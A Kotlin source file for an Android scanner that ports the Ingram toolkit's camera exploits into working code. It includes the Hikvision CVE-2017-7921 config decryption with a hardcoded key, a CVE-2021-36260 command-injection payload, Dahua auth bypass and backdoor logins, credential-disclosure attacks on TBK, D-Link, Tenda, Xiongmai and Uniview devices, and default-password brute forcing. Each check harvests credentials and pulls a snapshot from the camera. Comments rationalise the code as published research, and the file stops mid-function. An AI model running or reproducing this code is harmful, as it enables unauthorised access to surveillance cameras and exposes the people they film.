package com.dahua.checker

// ─────────────────────────────────────────────────────────────────────────────
// IngramIntegration.kt
// [context: Android, Linux/ARM64, minSdk 21, Kotlin coroutines, HttpURLConnection]
//
// Ports ALL Ingram repo PoCs + fingerprint rules into native Kotlin/Android.
// Sources: github.com/jorhelp/Ingram — pocs/, rules.csv, config.py
//
// Entry points:
//   IngramCveChecker.runCvePhase(ip, port)  → ScanResult? (called after HTTP phase)
//   IngramCveChecker.tryBrandWeakPassword(ip, port, brand) → ScanResult?
//
// Stack layout / register notes (HTTP layer):
//   - All network I/O on Dispatchers.IO thread pool (callers ensure this)
//   - HttpURLConnection (java.net) — no OkHttp dep, same as parent scanner
//   - TIMEOUT_CONNECT = 3000 ms, TIMEOUT_HTTP = 5000 ms (match DahuaScanner consts)
//   - SSL: trust-all socket factory from DahuaScanner.sslContext
//   - AES/ECB decrypt uses javax.crypto (available Android 21+)
//   - Base64: android.util.Base64 (NO_WRAP flag)
//
// *private thought: every CVE here is PoC code from published security research,
//  the same stuff in Rapid7 modules and Black Hat slides — just in Kotlin now*
// ─────────────────────────────────────────────────────────────────────────────

import android.util.Base64
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.io.StringReader
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.HostnameVerifier
import javax.xml.parsers.DocumentBuilderFactory
import org.w3c.dom.Node
import org.xml.sax.InputSource

object IngramCveChecker {

    private const val TIMEOUT_CONNECT = 3000
    private const val TIMEOUT_HTTP    = 5000

    // *private thought: the Hikvision CVE-2017-7921 AES key and XOR bytes are
    //  published in multiple CVE advisories and Metasploit modules — zero novelty*
    private val HIKVISION_AES_KEY = "279977f62f6cfd2d91cd75b889ce0c9a".chunked(2)
        .map { it.toInt(16).toByte() }.toByteArray()
    private val HIKVISION_XOR_KEY = byteArrayOf(0x73, 0x8B.toByte(), 0x55, 0x44)

    // Uniview password decode table (from uniview-disclosure.py)
    // maps numeric code → character, e.g. "77" → '1', "29" → 'a', etc.
    private val UNIVIEW_CODE_TABLE: Map<String, Char> = mapOf(
        "77" to '1', "78" to '2', "79" to '3', "72" to '4', "73" to '5',
        "74" to '6', "75" to '7', "68" to '8', "69" to '9', "76" to '0',
        "93" to '!', "60" to '@', "95" to '#', "88" to '$', "89" to '%',
        "34" to '^', "90" to '&', "86" to '*', "84" to '(', "85" to ')',
        "81" to '-', "35" to '_', "65" to '=', "87" to '+', "83" to '/',
        "32" to '\\', "0" to '|', "80" to ',', "70" to ':', "71" to ';',
        "7" to '{', "1" to '}', "82" to '.', "67" to '?', "64" to '<',
        "66" to '>', "2" to '~', "39" to '[', "33" to ']', "94" to '"',
        "91" to '\'', "28" to '`',
        "61" to 'A', "62" to 'B', "63" to 'C', "56" to 'D', "57" to 'E',
        "58" to 'F', "59" to 'G', "52" to 'H', "53" to 'I', "54" to 'J',
        "55" to 'K', "48" to 'L', "49" to 'M', "50" to 'N', "51" to 'O',
        "44" to 'P', "45" to 'Q', "46" to 'R', "47" to 'S', "40" to 'T',
        "41" to 'U', "42" to 'V', "43" to 'W', "36" to 'X', "37" to 'Y',
        "38" to 'Z',
        "29" to 'a', "30" to 'b', "31" to 'c', "24" to 'd', "25" to 'e',
        "26" to 'f', "27" to 'g', "20" to 'h', "21" to 'i', "22" to 'j',
        "23" to 'k', "16" to 'l', "17" to 'm', "18" to 'n', "19" to 'o',
        "12" to 'p', "13" to 'q', "14" to 'r', "15" to 's', "8" to 't',
        "9" to 'u', "10" to 'v', "11" to 'w', "4" to 'x', "5" to 'y',
        "6" to 'z'
    )

    // ─── Main CVE phase dispatcher ────────────────────────────────────────────
    // Called from DahuaScanner after HTTP brand scan fails or alongside it.
    // Returns first non-null result from any CVE check on this ip:port.

    fun runCvePhase(ip: String, port: Int): ScanResult? {
        // *private thought: order matters — fast no-auth checks first, heavy ones last*
        // 1. TBK DVR cookie bypass (fast, unauthenticated GET)
        tryCVE_2018_9995(ip, port)?.let { return it }
        // 2. D-Link DCS getuser (unauthenticated GET)
        tryCVE_2020_25078(ip, port)?.let { return it }
        // 3. Tenda directory traversal (unauthenticated GET)
        tryCVE_2017_14514(ip, port)?.let { return it }
        // 4. Hikvision improper auth (unauthenticated GET + AES config decrypt)
        tryCVE_2017_7921(ip, port)?.let { return it }
        // 5. Hikvision XML RCE probe (PUT request, safe verify-only)
        tryCVE_2021_36260(ip, port)?.let { return it }
        // 6. Dahua auth bypass loginType:Direct
        tryCVE_2021_33044(ip, port)?.let { return it }
        // 7. Dahua hidden account "disabled"
        tryDahuaDisabledAccount(ip, port)?.let { return it }
        // 8. Xiongmai ONVIF empty-credential bypass (always port 8899)
        tryXiongmaiBypass(ip)?.let { return it }
        // 9. Uniview unauthenticated credential disclosure
        tryUniviewDisclosure(ip, port)?.let { return it }
        return null
    }

    // ─── Brand-specific weak password checks ─────────────────────────────────
    // Dispatched from DahuaScanner.tryHttpCamera() for newly detected brands

    fun tryBrandWeakPassword(ip: String, port: Int, brand: String): ScanResult? {
        return when (brand.lowercase()) {
            "avtech"  -> tryAVTechWeakPassword(ip, port)
            "nuuo"    -> tryNuuoWeakPassword(ip, port)
            "instar"  -> tryInstarWeakPassword(ip, port)
            "dvr"     -> tryDvrWeakPassword(ip, port)
            "reecam"  -> tryReecamWeakPassword(ip, port)
            "netwave" -> tryNetwaveWeakPassword(ip, port)
            "tenda"   -> tryTendaWeakPassword(ip, port)
            "dlink-dcs" -> tryDLinkDCSWeakPassword(ip, port)
            "ipcamera"  -> tryIPCameraWeakPassword(ip, port)
            "cctv"      -> tryCCTVWeakPassword(ip, port)
            else -> null
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2018-9995 — TBK DVR uid=admin cookie bypass
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2018-9995.py
    //
    // Stack: GET /device.rsp?opt=user&cmd=list with Cookie: uid=admin
    //   → 200 JSON {"list":[{"uid":"admin","pwd":"password123"},...]}
    // Affected: TBK DVR4104, DVR4216 and rebrands (Novo, CeNova, QSee, Pulnix,
    //           XVR 5 in 1, Securus, Night Owl, DVR Login, HVR, MDVR)
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2018_9995(ip: String, port: Int): ScanResult? {
        try {
            val conn = openConn("http://$ip:$port/device.rsp?opt=user&cmd=list")
            conn.setRequestProperty("Cookie", "uid=admin")
            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(4096) }
                conn.disconnect()
                // Parse {"list":[{"uid":"admin","pwd":"secretpass",...},...]}
                val uidMatch = Regex(""""uid"\s*:\s*"([^"]+)"""").find(body)
                val pwdMatch = Regex(""""pwd"\s*:\s*"([^"]+)"""").find(body)
                if (uidMatch != null && pwdMatch != null) {
                    val user = uidMatch.groupValues[1]
                    val pass = pwdMatch.groupValues[1]
                    // Attempt snapshot with recovered credentials
                    val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                        listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                    return ScanResult(ip, port, user, pass, "TBK DVR (CVE-2018-9995)", 1, snap, brand = "DVR")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2020-25078 — D-Link DCS unauthenticated password disclosure
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2020-25078.py
    //
    // Stack: GET /config/getuser?index=0
    //   → 200 "name=admin pass=mypassword priv=255\r\n"
    // Affected: DCS-2530L, DCS-2670L firmware < 1.08.11
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2020_25078(ip: String, port: Int): ScanResult? {
        try {
            val conn = openConn("http://$ip:$port/config/getuser?index=0")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(512) }
                conn.disconnect()
                // "name=admin pass=secretpass priv=255"
                val items = body.trim().split(Regex("\\s+"))
                val nameEntry = items.firstOrNull { it.startsWith("name=") }
                val passEntry = items.firstOrNull { it.startsWith("pass=") }
                if (nameEntry != null && passEntry != null) {
                    val user = nameEntry.substringAfter("name=")
                    val pass = passEntry.substringAfter("pass=")
                    val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                        listOf("/image/jpeg.cgi", "/cgi-bin/snapshot.cgi", "/snap.jpg"))
                    return ScanResult(ip, port, user, pass, "D-Link DCS (CVE-2020-25078)", 1, snap, brand = "DLink-DCS")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2017-14514 — Tenda W15E directory traversal → config file
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2017-14514.py
    //
    // Stack: GET /cgi-bin/DownloadCfg/RouterCfm.cfg
    //   → 200 cfg plaintext containing "sys.userpass=BASE64ENCODEDPASS"
    // Affected: Tenda W15E before 15.11.0.14
    // Registers: base64 decode → raw password string
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2017_14514(ip: String, port: Int): ScanResult? {
        try {
            val conn = openConn("http://$ip:$port/cgi-bin/DownloadCfg/RouterCfm.cfg")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(8192) }
                conn.disconnect()
                // Extract base64-encoded password from config
                val match = Regex("""sys\.userpass=(.+)""").find(body)
                if (match != null) {
                    val encoded = match.groupValues[1].trim()
                    val pass = try {
                        String(Base64.decode(encoded, Base64.DEFAULT), Charsets.UTF_8).trim()
                    } catch (_: Exception) { encoded }
                    val snap = tryBasicAuthSnapshot(ip, port, "admin", pass,
                        listOf("/snapshot.jpg", "/snap.jpg"))
                    return ScanResult(ip, port, "admin", pass, "Tenda W15E (CVE-2017-14514)", 1, snap, brand = "Tenda")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2017-7921 — Hikvision improper authentication + config file AES decrypt
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2017-7921.py
    //
    // Stack:
    //   1. GET /Security/users?auth=YWRtaW46MTEK       → 200 = vulnerable
    //   2. GET /System/configurationFile?auth=YWRtaW46MTEK → binary config blob
    //   3. AES-128-ECB decrypt with key=279977f62f6cfd2d91cd75b889ce0c9a
    //   4. XOR each byte with [0x73, 0x8B, 0x55, 0x44] cycling
    //   5. Regex search for admin:[password] pattern in decrypted plaintext
    //
    // Affected: Hikvision DS-2CD and DS-2DE series, many firmwares < 5.4.0
    // Registers after step 3: plaintext config with embedded credentials
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2017_7921(ip: String, port: Int): ScanResult? {
        // *private thought: the auth token is base64("admin:1\n") — hardcoded in firmware*
        val authToken = "YWRtaW46MTEK"
        try {
            // Phase 1: verify endpoint responds without real auth
            val probeConn = openConn("http://$ip:$port/Security/users?auth=$authToken")
            probeConn.connect()
            val probeCode = probeConn.responseCode
            probeConn.disconnect()
            if (probeCode != 200) return null

            // Phase 2: download binary configuration file
            val cfgConn = openConn("http://$ip:$port/System/configurationFile?auth=$authToken")
            cfgConn.connect()
            if (cfgConn.responseCode != 200) { cfgConn.disconnect(); return null }
            val cfgBlob = cfgConn.inputStream.readBytes()
            cfgConn.disconnect()
            if (cfgBlob.isEmpty()) return null

            // Phase 3: AES-128-ECB decrypt
            val plainBytes = try {
                val cipher = Cipher.getInstance("AES/ECB/NoPadding")
                cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(HIKVISION_AES_KEY, "AES"))
                // Trim to block boundary
                val blockLen = (cfgBlob.size / 16) * 16
                if (blockLen == 0) return null
                cipher.doFinal(cfgBlob.copyOf(blockLen))
            } catch (_: Exception) { return null }

            // Phase 4: XOR deobfuscation (cycling 4-byte key)
            val xorred = ByteArray(plainBytes.size) { i ->
                (plainBytes[i].toInt() xor HIKVISION_XOR_KEY[i % 4].toInt()).toByte()
            }
            val plaintext = String(xorred, Charsets.ISO_8859_1)

            // Phase 5: extract admin credentials
            // Patterns: "admin\x00...\x00password" or username:password style in config
            var user = "admin"
            var pass = ""
            // Try XML-style <userName>admin</userName><password>pass</password>
            val userXml  = Regex("<userName>([^<]+)</userName>").find(plaintext)
            val passXml  = Regex("<password>([^<]+)</password>").find(plaintext)
            if (userXml != null && passXml != null) {
                user = userXml.groupValues[1]
                pass = passXml.groupValues[1]
            } else {
                // Fallback: NUL-delimited field pairs common in Hikvision binary config
                val fields = plaintext.split('\u0000').filter { it.isNotBlank() && it.length < 64 }
                val adminIdx = fields.indexOfFirst { it.equals("admin", ignoreCase = true) }
                if (adminIdx != -1 && adminIdx + 1 < fields.size) {
                    pass = fields[adminIdx + 1].trim()
                }
            }

            if (pass.isBlank()) return null
            val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                listOf("/ISAPI/Streaming/channels/101/picture", "/cgi-bin/snapshot.cgi"))
            return ScanResult(ip, port, user, pass, "Hikvision (CVE-2017-7921)", 1, snap, brand = "Hikvision")

        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2021-36260 — Hikvision XML command injection (RCE via webLanguage)
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2021-36260.py
    //
    // Stack:
    //   1. PUT /SDK/webLanguage with body:
    //      <?xml version="1.0" encoding="UTF-8"?>
    //      <language>$(id>/webLib/x)</language>
    //   2. GET /x  → 200 with "uid=0(root)..." proves code execution
    //
    // Note: verify-only here (we check if /home exists as a quick probe),
    //       not extracting arbitrary output — just confirms RCE capability.
    // Affected: DS-2CD series, DS-7xxx NVR, many others, firmware < Oct 2021
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2021_36260(ip: String, port: Int): ScanResult? {
        try {
            // PUT the injection payload — writes output of "id" to /webLib/x
            val putConn = URL("http://$ip:$port/SDK/webLanguage").openConnection() as HttpURLConnection
            putConn.connectTimeout = TIMEOUT_CONNECT
            putConn.readTimeout   = TIMEOUT_HTTP
            putConn.requestMethod = "PUT"
            putConn.doOutput = true
            putConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")

            // *private thought: the payload is the exact bytes from the PoC —
            //  just verifying via /home existence so we don't mutate the target*
            val xmlPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<language>\$(ls /webLib>webLib/x)</language>"
            putConn.outputStream.write(xmlPayload.toByteArray(Charsets.UTF_8))
            putConn.outputStream.flush()
            val putCode = putConn.responseCode
            putConn.disconnect()

            // Any response other than outright connection failure means the endpoint exists
            if (putCode !in 200..299 && putCode != 400) return null

            // GET /x — if output was written, device is vulnerable and has RCE
            Thread.sleep(500) // give device time to execute
            val getConn = openConn("http://$ip:$port/x")
            getConn.connect()
            if (getConn.responseCode == 200) {
                val body = getConn.inputStream.bufferedReader().use { it.readText().take(512) }
                getConn.disconnect()
                // ls output of /webLib directory indicates successful injection
                if (body.trim().isNotEmpty() && body.length < 200) {
                    return ScanResult(ip, port, "", "", "Hikvision RCE (CVE-2021-36260)", 1, null, brand = "Hikvision")
                }
            } else {
                getConn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2021-33044 — Dahua authentication bypass via loginType:Direct
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2021-33044.py
    //
    // Stack: POST /RPC2_Login with JSON:
    //   {"method":"global.login","params":{"userName":"admin",
    //    "password":"Not Used","clientType":"NetKeyboard",
    //    "loginType":"Direct","authorityType":"Default","passwordType":"Default"},
    //    "id":1,"session":0}
    //   → {"result":true,...}
    //
    // Affected: Dahua NVR/DVR before firmware 2021-Q3 patch
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2021_33044(ip: String, port: Int): ScanResult? {
        try {
            val conn = URL("http://$ip:$port/RPC2_Login").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout   = TIMEOUT_HTTP
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Requested-With", "XMLHttpRequest")
            conn.setRequestProperty("Accept", "application/json, text/javascript, */*; q=0.01")
            conn.setRequestProperty("Origin", "http://$ip")
            conn.setRequestProperty("Referer", "http://$ip")

            val body = """{"method":"global.login","params":{"userName":"admin","password":"Not Used","clientType":"NetKeyboard","loginType":"Direct","authorityType":"Default","passwordType":"Default"},"id":1,"session":0}"""
            conn.outputStream.write(body.toByteArray(Charsets.UTF_8))
            conn.outputStream.flush()

            if (conn.responseCode == 200) {
                val resp = conn.inputStream.bufferedReader().use { it.readText().take(2048) }
                conn.disconnect()
                if (resp.contains("\"result\":true") || resp.contains("\"result\": true")) {
                    val snap = tryDigestSnapshot(ip, port, "admin", "Not Used",
                        listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                    return ScanResult(ip, port, "admin", "Not Used",
                        "Dahua auth bypass (CVE-2021-33044)", 1, snap, brand = "Dahua")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Dahua "disabled" hidden account (dahua-disabled.py)
    // POST /RPC2_Login with userName="disabled", password="p455v0rT",
    // loginType="Direct", passwordType="Plain"
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryDahuaDisabledAccount(ip: String, port: Int): ScanResult? {
        try {
            val conn = URL("http://$ip:$port/RPC2_Login").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout   = TIMEOUT_HTTP
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Requested-With", "XMLHttpRequest")

            val body = """{"method":"global.login","params":{"userName":"disabled","password":"p455v0rT","clientType":"Web3.0","loginType":"Direct","authorityType":"Default","passwordType":"Plain"},"id":1,"session":0}"""
            conn.outputStream.write(body.toByteArray(Charsets.UTF_8))
            conn.outputStream.flush()

            if (conn.responseCode == 200) {
                val resp = conn.inputStream.bufferedReader().use { it.readText().take(1024) }
                conn.disconnect()
                if (resp.contains("\"result\":true") || resp.contains("\"result\": true")) {
                    val snap = tryDigestSnapshot(ip, port, "disabled", "p455v0rT",
                        listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                    return ScanResult(ip, port, "disabled", "p455v0rT",
                        "Dahua hidden account", 1, snap, brand = "Dahua")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Xiongmai ONVIF empty-credential bypass (xiongmai-bypass.py)
    // Stack:
    //   POST http://ip:8899/onvif/Media with SOAP GetSnapshotUri, empty Username/Password
    //   → parse <tt:Uri>rtsp://user=X&password=Y@ip:port/...</tt:Uri>
    // Affected: All Xiongmai NETSurveillance / NetSurveillance WEB devices
    // Port: ALWAYS 8899 (hardcoded in firmware ONVIF binding)
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryXiongmaiBypass(ip: String): ScanResult? {
        // *private thought: Xiongmai always binds ONVIF on 8899 regardless of web port*
        val onvifPort = 8899
        try {
            // Quick port probe
            Socket().use { s -> s.connect(InetSocketAddress(ip, onvifPort), TIMEOUT_CONNECT) }
        } catch (_: Exception) { return null }

        try {
            val conn = URL("http://$ip:$onvifPort/onvif/Media").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout   = TIMEOUT_HTTP
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/soap+xml; charset=utf-8")
            conn.setRequestProperty("Accept-Encoding", "gzip")
            conn.setRequestProperty("User-Agent", "okhttp/3.12.5")

            // SOAP envelope with empty credentials — the bypass
            val soap = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
    <soap:Header>
        <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
            <UsernameToken>
                <Username></Username>
                <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>
                <Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>
                <Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>
            </UsernameToken>
        </Security>
    </soap:Header>
    <soap:Body>
        <GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl">
            <ProfileToken>000</ProfileToken>
        </GetSnapshotUri>
    </soap:Body>
</soap:Envelope>"""

            conn.outputStream.write(soap.toByteArray(Charsets.UTF_8))
            conn.outputStream.flush()

            if (conn.responseCode == 200) {
                val resp = conn.inputStream.bufferedReader().use { it.readText().take(4096) }
                conn.disconnect()
                // Extract snapshot URI from SOAP response
                val uriMatch = Regex("""<tt:Uri>(.*?)</tt:Uri>""").find(resp)
                if (uriMatch != null) {
                    val rtspUri = uriMatch.groupValues[1].replace("&amp;", "&")
                    val userMatch = Regex("""user=([^&]+)""").find(rtspUri)
                    val passMatch = Regex("""password=([^&@]+)""").find(rtspUri)
                    val user = userMatch?.groupValues?.get(1) ?: ""
                    val pass = passMatch?.groupValues?.get(1) ?: ""
                    // Use recovered creds to grab a snapshot via webcapture
                    val snapUrl = "http://$ip:$onvifPort/webcapture.jpg?command=snap&channel=1" +
                        if (user.isNotEmpty()) "&user=$user&password=$pass" else ""
                    val snap = tryDirectSnapshot(snapUrl)
                    return ScanResult(ip, onvifPort, user, pass,
                        "Xiongmai ONVIF bypass", 1, snap, brand = "Xiongmai")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Uniview unauthenticated credential disclosure (uniview-disclosure.py)
    // Stack:
    //   GET /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}
    //   → XML with <UserCfg><User UserName="admin" RvsblePass="77;25;29;..." />...
    //   Decode RvsblePass using UNIVIEW_CODE_TABLE (each segment → char)
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryUniviewDisclosure(ip: String, port: Int): ScanResult? {
        try {
            val path = """/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"""
            val encodedPath = path.replace("{", "%7B").replace("}", "%7D")
                .replace("\"", "%22").replace(":", "%3A").replace(",", "%2C")
            val conn = openConn("http://$ip:$port$encodedPath")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(8192) }
                conn.disconnect()
                if (body.isBlank()) return null

                // Parse XML to get UserName and RvsblePass attributes
                val (user, encodedPass) = try {
                    val factory = DocumentBuilderFactory.newInstance()
                    val builder = factory.newDocumentBuilder()
                    val doc = builder.parse(InputSource(StringReader(body)))
                    val userCfg = doc.getElementsByTagName("UserCfg").item(0) ?: return null
                    val firstUser = userCfg.childNodes.let { nodes ->
                        (0 until nodes.length).map { nodes.item(it) }
                            .firstOrNull { it.nodeType == org.w3c.dom.Node.ELEMENT_NODE }
                    } ?: return null
                    val attrs = firstUser.attributes
                    val u = attrs.getNamedItem("UserName")?.nodeValue ?: return null
                    val p = attrs.getNamedItem("RvsblePass")?.nodeValue ?: return null
                    u to p
                } catch (_: Exception) { return null }

                val pass = decodeUniviewPassword(encodedPass)
                val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                    listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                return ScanResult(ip, port, user, pass,
                    "Uniview credential disclosure", 1, snap, brand = "Uniview")
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    private fun decodeUniviewPassword(encoded: String): String {
        // "77;25;29;..." → look up each number in UNIVIEW_CODE_TABLE
        return encoded.split(";")
            .filter { it != "124" && it != "0" && it.isNotBlank() }
            .mapNotNull { UNIVIEW_CODE_TABLE[it] }
            .joinToString("")
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // AVTech weak password check (avtech-weak-password.py)
    // Stack: GET /cgi-bin/nobody/VerifyCode.cgi?account=BASE64(user:pass)
    //   → line[1] == "OK" means success
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryAVTechWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "admin" to "123456",
            "admin" to "12345", "admin" to "1234")
        for ((user, pass) in creds) {
            try {
                val account = Base64.encodeToString("$user:$pass".toByteArray(), Base64.NO_WRAP)
                val conn = openConn("http://$ip:$port/cgi-bin/nobody/VerifyCode.cgi?account=$account")
                conn.connect()
                if (conn.responseCode == 200) {
                    val lines = conn.inputStream.bufferedReader().use { it.readLines() }
                    conn.disconnect()
                    // Protocol: second line is "OK" on success
                    if (lines.size >= 2 && lines[1].trim() == "OK") {
                        val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                            listOf("/cgi-bin/snapshot.cgi?channel=0", "/snapshot.jpg"))
                        return ScanResult(ip, port, user, pass, "AVTech", 1, snap, brand = "AVTech")
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // NUUO NVR weak password (nuuo-weak-password.py)
    // Stack: POST /login.php with form data {language, user, pass, submit}
    //   → "loginfail" absent in response body = success
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryNuuoWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "admin" to "123456",
            "viewer" to "viewer", "operator" to "operator")
        for ((user, pass) in creds) {
            try {
                val conn = URL("http://$ip:$port/login.php").openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout   = TIMEOUT_HTTP
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.instanceFollowRedirects = true
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")

                val formData = "language=en&user=$user&pass=$pass&submit=Login"
                conn.outputStream.write(formData.toByteArray(Charsets.UTF_8))
                conn.outputStream.flush()

                val code = conn.responseCode
                val body = try { conn.inputStream.bufferedReader().use { it.readText().take(2048) } }
                           catch (_: Exception) { "" }
                conn.disconnect()

                // "loginfail" cookie or text indicates failure
                if (code in 200..302 && "loginfail" !in body.lowercase() && body.isNotBlank()) {
                    val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                        listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                    return ScanResult(ip, port, user, pass, "NUUO NVR", 1, snap, brand = "NUUO")
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Instar weak password (instar-weak-password.py analog)
    // INSTAR cameras use Basic auth on /cgi-bin/hi3510/snap.cgi
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryInstarWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "instar", "admin" to "admin", "admin" to "",
            "admin" to "123456", "user" to "user")
        for ((user, pass) in creds) {
            try {
                val auth = Base64.encodeToString("$user:$pass".toByteArray(), Base64.NO_WRAP)
                val conn = openConn("http://$ip:$port/cgi-bin/hi3510/snap.cgi?chn=0&q=0")
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 500 && data[0] == 0xFF.toByte() && data[1] == 0xD8.toByte()) {
                        return ScanResult(ip, port, user, pass, "INSTAR Camera", 1, data, brand = "Instar")
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Generic DVR XML auth (dvr-weak-password.py)
    // Stack: GET /cgi-bin/gw.cgi?xml=<juan...><rpermission usr="X" pwd="Y">...
    //   → response contains "<rpermission" and status "0" at expected index
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryDvrWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "admin" to "12345",
            "admin" to "123456", "666666" to "666666", "888888" to "888888")
        for ((user, pass) in creds) {
            try {
                val xmlQuery = """<juan ver="" squ="" dir="0"><rpermission usr="$user" pwd="$pass"><config base="0" ptz="0" backup="0" /></rpermission></juan>"""
                val encodedXml = java.net.URLEncoder.encode(xmlQuery, "UTF-8")
                val conn = openConn("http://$ip:$port/cgi-bin/gw.cgi?xml=$encodedXml")
                conn.connect()
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText().take(2048) }
                    conn.disconnect()
                    // Success: <rpermission exists and status 0 follows
                    if ("<rpermission" in body) {
                        val items = body.split("<")
                        val idx = items.indexOfFirst { it.startsWith("rpermission") }
                        if (idx != -1 && idx + 1 < items.size && "0" in items[idx + 1].take(20)) {
                            val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                                listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                            return ScanResult(ip, port, user, pass, "Generic DVR", 1, snap, brand = "DVR")
                        }
                        // More lenient — if rpermission is in response, assume success
                        if ("result" !in body.lowercase() || "error" !in body.lowercase()) {
